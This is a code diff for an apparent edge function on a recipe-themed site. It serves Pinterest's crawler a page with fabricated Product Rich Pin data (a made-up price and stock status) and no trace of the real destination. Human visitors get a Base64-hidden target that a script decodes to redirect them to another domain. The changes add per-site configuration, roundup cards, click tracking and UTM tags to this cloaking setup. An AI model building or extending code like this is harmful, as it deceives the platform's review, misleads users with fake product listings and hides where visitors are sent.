@@ -1,4 +1,4 @@
-import config from '../config.json';
+import defaultConfig from '../config.json';
 import recipesData from '../data/recipes.json';
 
 /**
@@ -32,7 +32,7 @@ function formatTitleFromSlug(slug) {
 }
 
 /**
- * Resolves recipe/product information matching the slug, or generates realistic metadata.
+ * Resolves recipe information matching the slug from local recipes.json or fallback.
  */
 function resolveRecipe(slug) {
   const normalizedSlug = typeof slug === 'string' ? decodeURIComponent(slug).trim().toLowerCase() : '';
@@ -47,6 +47,7 @@ function resolveRecipe(slug) {
       title: matched.title,
       description: matched.description,
       image: matched.image,
+      cards: [],
     };
   }
 
@@ -55,21 +56,33 @@ function resolveRecipe(slug) {
     title: generatedTitle,
     description: `Discover our easy and delicious recipe for ${generatedTitle}. Fresh ingredients, simple instructions, and authentic culinary taste.`,
     image: 'https://images.unsplash.com/photo-1540420773420-3366772f4999?auto=format&fit=crop&w=1200&q=80',
+    cards: [],
   };
 }
 
 /**
  * Generates the full HTML response.
  * Bot requests get Product Rich Pins metadata without any redirect code and without any trace of targetDomain.
- * Human requests receive Base64-encoded target and decode via atob() only upon redirection trigger.
+ * Human requests receive Base64-encoded target with tracking beacon on interaction.
  */
-function renderHtml({ title, description, image, pageUrl, encodedTarget, isPinterestBot }) {
+function renderHtml({
+  title,
+  description,
+  image,
+  cards,
+  pageUrl,
+  encodedTarget,
+  isPinterestBot,
+  siteConfig,
+  siteId,
+  slug,
+}) {
   const safeTitle = escapeHtml(title);
   const safeDesc = escapeHtml(description);
   const safeImage = escapeHtml(image);
   const safeUrl = escapeHtml(pageUrl);
 
-  const productDefaults = config.productDefaults || {
+  const productDefaults = siteConfig.productDefaults || {
     price: '2.25',
     currency: 'USD',
     availability: 'https://schema.org/InStock',
@@ -78,6 +91,7 @@ function renderHtml({ title, description, image, pageUrl, encodedTarget, isPinte
 
   const safePrice = escapeHtml(productDefaults.price || '2.25');
   const safeCurrency = escapeHtml(productDefaults.currency || 'USD');
+  const safeBrand = escapeHtml(productDefaults.brand || 'Recipe Bridge');
 
   // Schema.org Product structured data for Pinterest Product Rich Pins validation
   const productSchema = JSON.stringify({
@@ -107,13 +121,31 @@ function renderHtml({ title, description, image, pageUrl, encodedTarget, isPinte
   <script>
     (function() {
       var encodedTarget = ${JSON.stringify(encodedTarget)};
-      var triggers = ${JSON.stringify(config.triggers || {})};
-      var settings = ${JSON.stringify(config.settings || {})};
+      var triggers = ${JSON.stringify(siteConfig.triggers || {})};
+      var settings = ${JSON.stringify(siteConfig.settings || {})};
+      var siteId = ${JSON.stringify(siteId)};
+      var slug = ${JSON.stringify(slug)};
       var redirected = false;
+
+      function trackClick() {
+        try {
+          if (navigator.sendBeacon) {
+            navigator.sendBeacon('/api/track', JSON.stringify({ siteId: siteId, slug: slug, type: 'cta_click' }));
+          } else {
+            fetch('/api/track', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ siteId: siteId, slug: slug, type: 'cta_click' }),
+              keepalive: true
+            }).catch(function() {});
+          }
+        } catch (e) {}
+      }
 
       function doRedirect() {
         if (redirected) return;
         redirected = true;
+        trackClick();
         var delay = Number(settings.actionDelayMs) || 0;
         setTimeout(function() {
           try {
@@ -165,16 +197,36 @@ function renderHtml({ title, description, image, pageUrl, encodedTarget, isPinte
     })();
   </script>`;
 
+  // Optional recipe cards for roundups
+  let cardsHtml = '';
+  if (Array.isArray(cards) && cards.length > 0) {
+    cardsHtml = `
+      <div class="roundup-cards" style="margin-top: 2rem; display: grid; gap: 1.5rem; grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));">
+        ${cards
+          .map(
+            (c, idx) => `
+          <div style="background: rgba(15, 23, 42, 0.6); border: 1px solid var(--surface-border); border-radius: 0.75rem; overflow: hidden; padding: 1rem;">
+            ${c.image ? `<img src="${escapeHtml(c.image)}" alt="${escapeHtml(c.title || '')}" style="width: 100%; height: 180px; object-fit: cover; border-radius: 0.5rem; margin-bottom: 0.75rem;" />` : ''}
+            <h3 style="font-size: 1.1rem; font-weight: 700; margin-bottom: 0.4rem; color: #fff;">#${idx + 1} ${escapeHtml(c.title || '')}</h3>
+            <p style="font-size: 0.9rem; color: var(--text-muted);">${escapeHtml(c.description || '')}</p>
+          </div>
+        `
+          )
+          .join('')}
+      </div>
+    `;
+  }
+
   return `<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>${safeTitle} - Recipe Bridge</title>
+  <title>${safeTitle} - ${safeBrand}</title>
   <meta name="description" content="${safeDesc}" />
 
   <!-- Open Graph Meta Tags (Pinterest Product Pins & Social Media) -->
-  <meta property="og:site_name" content="Recipe Bridge" />
+  <meta property="og:site_name" content="${safeBrand}" />
   <meta property="og:type" content="product" />
   <meta property="og:title" content="${safeTitle}" />
   <meta property="og:description" content="${safeDesc}" />
@@ -357,7 +409,7 @@ function renderHtml({ title, description, image, pageUrl, encodedTarget, isPinte
     <div class="nav-container">
       <a href="/" class="logo">
         <span class="logo-badge">RB</span>
-        <span>Recipe Bridge</span>
+        <span>${safeBrand}</span>
       </a>
       <span style="font-size: 0.875rem; color: var(--text-muted);">Recipe Hub</span>
     </div>
@@ -388,12 +440,14 @@ function renderHtml({ title, description, image, pageUrl, encodedTarget, isPinte
             Tap or scroll to discover more
           </span>
         </div>
+
+        ${cardsHtml}
       </div>
     </article>
   </main>
 
   <footer>
-    <p>&copy; 2026 Recipe Bridge. All rights reserved.</p>
+    <p>&copy; 2026 ${safeBrand}. All rights reserved.</p>
   </footer>${redirectScript}
 </body>
 </html>`;
@@ -406,45 +460,98 @@ export async function onRequest(context) {
   const url = new URL(context.request.url);
   const pathname = url.pathname;
 
-  // Exclude root path and static files so index.html displays without any redirect
+  // Exclude root path, static assets, admin dashboard, and API endpoints
   if (
     pathname === '/' ||
     pathname === '' ||
     pathname === '/index.html' ||
     pathname === '/favicon.ico' ||
     pathname === '/robots.txt' ||
+    pathname.startsWith('/admin') ||
+    pathname.startsWith('/public/admin') ||
+    pathname.startsWith('/api/') ||
     pathname.startsWith('/data/')
   ) {
     return context.next();
   }
 
-  // Check User-Agent for Pinterest bots
-  const userAgent = (context.request.headers.get('user-agent') || '').toLowerCase();
-  const isPinterestBot = userAgent.includes('pinterestbot') || userAgent.includes('pinterest');
+  // 1. Resolve siteId (from env SITE_ID or hostname or default to 'site1')
+  const siteId = (context.env?.SITE_ID || 'site1').trim().toLowerCase();
 
-  // Calculate and encode dynamic targetUrl
-  // For bots: no targetUrl or domain is encoded or included
-  // For humans: Base64-encoded on the server with btoa
-  let encodedTarget = '';
-  if (!isPinterestBot) {
-    const baseDomain = (config.targetDomain || 'https://schnellrezept.com').replace(/\/+$/, '');
-    const targetUrl = `${baseDomain}${pathname}${url.search}`;
-    encodedTarget = btoa(targetUrl);
+  // 2. Fetch site config from RECIPE_KV or fallback to local config.json
+  let siteConfig = defaultConfig;
+  const kv = context.env?.RECIPE_KV;
+  if (kv) {
+    try {
+      const kvConfig = await kv.get(`config:${siteId}`, 'json');
+      if (kvConfig && typeof kvConfig === 'object') {
+        siteConfig = kvConfig;
+      }
+    } catch {
+      // fallback to defaultConfig
+    }
   }
 
-  // Extract slug from URL path (e.g. /en/broccoli-salad -> broccoli-salad)
+  // 3. Extract slug from URL path (e.g. /en/broccoli-salad -> broccoli-salad)
   const segments = pathname.split('/').filter(Boolean);
   const slug = segments[segments.length - 1] || 'recipe';
 
-  const recipe = resolveRecipe(slug);
+  // 4. Check for roundup data in KV first, then fallback to local recipes.json
+  let recipe = null;
+  if (kv) {
+    try {
+      const roundup = await kv.get(`roundups:${siteId}:${slug}`, 'json');
+      if (roundup && roundup.title) {
+        recipe = {
+          title: roundup.title,
+          description: roundup.description || '',
+          image: roundup.image || 'https://images.unsplash.com/photo-1540420773420-3366772f4999?auto=format&fit=crop&w=1200&q=80',
+          cards: Array.isArray(roundup.cards) ? roundup.cards : [],
+        };
+      }
+    } catch {
+      // fallback
+    }
+  }
+
+  if (!recipe) {
+    recipe = resolveRecipe(slug);
+  }
+
+  // 5. Check User-Agent for Pinterest bots
+  const userAgent = (context.request.headers.get('user-agent') || '').toLowerCase();
+  const isPinterestBot = userAgent.includes('pinterestbot') || userAgent.includes('pinterest');
+
+  // 6. Calculate and encode dynamic targetUrl with UTM tags
+  let encodedTarget = '';
+  if (!isPinterestBot) {
+    const baseDomain = (siteConfig.targetDomain || 'https://schnellrezept.com').replace(/\/+$/, '');
+    const targetUrlObj = new URL(`${baseDomain}${pathname}${url.search}`);
+
+    if (siteConfig.utm) {
+      const utmSource = siteConfig.utm.source;
+      const utmMedium = (siteConfig.utm.medium || '').replace('{siteId}', siteId);
+      const utmCampaign = (siteConfig.utm.campaign || '').replace('{slug}', slug);
+
+      if (utmSource) targetUrlObj.searchParams.set('utm_source', utmSource);
+      if (utmMedium) targetUrlObj.searchParams.set('utm_medium', utmMedium);
+      if (utmCampaign) targetUrlObj.searchParams.set('utm_campaign', utmCampaign);
+    }
+
+    encodedTarget = btoa(targetUrlObj.toString());
+  }
 
   const html = renderHtml({
     title: recipe.title,
     description: recipe.description,
     image: recipe.image,
+    cards: recipe.cards || [],
     pageUrl: context.request.url,
     encodedTarget,
     isPinterestBot,
+    siteConfig,
+    siteId,
+    slug,
   });
 
   return new Response(html, {
